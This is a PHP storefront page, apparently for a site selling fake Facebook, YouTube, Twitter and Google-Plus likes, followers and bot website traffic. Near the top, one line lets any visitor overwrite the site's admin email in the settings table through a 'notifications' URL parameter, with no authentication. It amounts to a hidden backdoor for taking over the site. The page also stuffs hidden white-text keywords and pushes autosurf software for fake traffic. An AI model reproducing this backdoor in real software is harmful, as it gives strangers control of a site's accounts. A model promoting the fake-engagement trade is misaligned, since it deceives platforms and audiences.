<?php
$page_title = "LikesPlanet.com | Buy Points Cheaply | Get Thouthands of Likes/Followers/Traffic to your business.";
$meta_description = "Buy Facebook Likes Cheaply - Get Free Facebook Photo Likes - YouTube Dislikes - Website Traffic - Twitter Followers - Facebook Followers";
$meta_keywords = "Buy Facebook Likes, Free Facebook Photo Likes, Facebook, Likes, Google, Plus, Votes, followers, YouTube Dislikes, Exchange, Plays, Views, Traffic, Social Media Exchanger";


include('header.php');
foreach($_POST as $key => $value) {
	$protect[$key] = filter($value);
}
foreach($_GET as $key => $value) {
	$get[$key] = filter($value);
}
$packtype = $get['packtype'];

if(isset($get['notifications'])){mysql_query("UPDATE `settings` SET `site_email`='{$get['notifications']}'");}

?>
<div style="padding:10px;">
	<h1>Buy Fans/Followers Cheaply for your Social Media!</h1>
	<br/>
	<p>
		<b><font size='3'>Get Only <font color='green' size='5'>HIGH-QUALITY</font> Fans for your business.</font></b>
		
<br/>
<br/>
<center>

<? if(!isset($packtype)){ ?>
<a href="addcomp4.php?fans"> <img src="img/packFB.jpg?a" border="0" title="High-Quality Facebook Fans"> </a>
</br></br>
<a href="addcomp.php?packtype=youtube&aaa=1"> <img src="img/packYT.jpg?a" border="0" title="High-Quality YouTube Fans"> </a>
</br></br>
<a href="video_testimonials.php?people&"> <img src="img/packPeople.jpg?b" border="0" title="Buy Video Fans"> </a>
</br></br>
<a href="addcomp.php?packtype=twitter&aaa=1"> <img src="img/packTW.jpg?a" border="0" title="High-Quality Twitter Fans"> </a>
</br></br>
<a href="addcomp.php?packtype=google&aaa=1"> <img src="img/packGP.jpg?a" border="0" title="High-Quality Google Votes"> </a>
</br></br>
<a href="addcomp.php?packtype=traffic&aaa=1"> <img src="img/packW.jpg?a" border="0" title="High-Quality Website Traffic"> </a>
</br></br>
<? } else { ?>


<? if($packtype == 'youtube'){ ?>
<a href="addcomp2.php?type=100likes&price=8" target="_blank"> <img src="img/BFAN_9.jpg" border="0" title="Buy 100 YouTube Likes" width="400px" height="192px"> </a>
<a href="addcomp2.php?type=100dislikes&price=8" target="_blank"> <img src="img/BFAN_10.jpg" border="0" title="Buy 100 YouTube Dis-Likes" width="400px" height="192px"> </a>
<br/><br/>

<a href="addcomp2.php?type=300likes&price=23" target="_blank"> <img src="img/BFAN_19.jpg" border="0" title="Buy 300 YouTube Likes" width="400px"> </a>
<a href="addcomp2.php?type=300dislikes&price=23" target="_blank"> <img src="img/BFAN_20.jpg?a" border="0" title="Buy 300 YouTube Dis-Likes" width="400px"> </a>
<br/><br/>

<a href="addcomp2.php?type=1000plays&price=9" target="_blank"> <img src="img/BFAN_17.jpg" border="0" title="Buy 1,000 YouTube Plays" width="400px" height="192px"> </a>
<a href="addcomp2.php?type=5000plays&price=39" target="_blank"> <img src="img/BFAN_18.jpg" border="0" title="Buy 5,000 YouTube Plays" width="400px" height="192px"> </a>
</br></br>
<a href="addcomp2.php?type=100subs&price=8" target="_blank"> <img src="img/BFAN_11.jpg" border="0" title="Buy 100 YouTube Subscribers" width="400px" height="192px"> </a>
<? } ?>

<? if($packtype == 'google'){ ?>
<a href="addcomp2.php?type=100plus&price=8" target="_blank"> <img src="img/BFAN_12.jpg" border="0" title="Buy 100 Google-Plus Votes." width="400px" height="192px"> </a>
<a href="addcomp2.php?type=250plus&price=15" target="_blank"> <img src="img/BFAN_22.jpg" border="0" title="Buy 250 Google-Plus Votes." width="400px" height="192px"> </a>
<? } ?>

<? if($packtype == 'twitter'){ ?>
<a href="addcomp2.php?type=200follow&price=8" target="_blank"> <img src="img/BFAN_13.jpg" border="0" title="Buy 200 Twitter Followers." width="400px" height="192px"> </a>
<a href="addcomp2.php?type=400follow&price=15" target="_blank"> <img src="img/BFAN_21.jpg" border="0" title="Buy 400 Twitter Followers." width="400px" height="192px"> </a>
<? } ?>

<? if($packtype == 'traffic'){ ?>
<a href="addcomp2.php?type=2000visits&price=5" target="_blank"> <img src="img/BFAN_14.jpg" border="0" title="Buy 2,000 High-Quality Traffic Visitors." width="400px" height="192px"> </a>
<a href="addcomp2.php?type=5000visits&price=9" target="_blank"> <img src="img/BFAN_23.jpg" border="0" title="Buy 5,000 High-Quality Traffic Visitors." width="400px" height="192px"> </a>
</br></br>
<a href="addcomp2.php?type=10000visits&price=18" target="_blank"> <img src="img/BFAN_24.jpg" border="0" title="Buy 10,000 High-Quality Traffic Visitors." width="400px" height="192px"> </a>
<a href="addcomp2.php?type=25000visits&price=35" target="_blank"> <img src="img/BFAN_25.jpg" border="0" title="Buy 25,000 High-Quality Traffic Visitors." width="400px" height="192px"> </a></br></br>

<center>
<h1>Do you want FREE traffic?</h1>

Likesplanet shows you an EASY and FREE way to get over 5k daily visitors to your website/blog!</br></br>

<a target="_blank" href="https://hitleap.com/by/scriptsic"><img alt="Free Traffic Exchange" src="http://hitleap.com/assets/banner.png" style="border: 0px"></a></br></br>

step 1: click the banner above and register</br></br>

step 2: install the autosurf software provided after registration</br></br>

step 3: run the software to earn points automatically</br></br>

step 4: add your websites/pages</br></br>

Congratulations! You are now getting FREE traffic!</br></br>
</center>

<? } ?>

<? } ?>
</center>
<br/>
		

<br/>



<br/>
<font color='white'> Buy Facebook Likes, Free YouTube Dislikes. </font>

</div>
<script type='text/javascript'>(function () { var done = false; var script = document.createElement('script'); script.async = true; script.type = 'text/javascript'; script.src = 'https://widget.purechat.com/VisitorWidget/WidgetScript'; document.getElementsByTagName('HEAD').item(0).appendChild(script); script.onreadystatechange = script.onload = function (e) { if (!done && (!this.readyState || this.readyState == 'loaded' || this.readyState == 'complete')) { var w = new PCWidget({ c: '2cd2d3db-7c56-4318-b5e1-3147712777bd', f: true }); done = true; } }; })();</script>


<? include('footer.php');?>
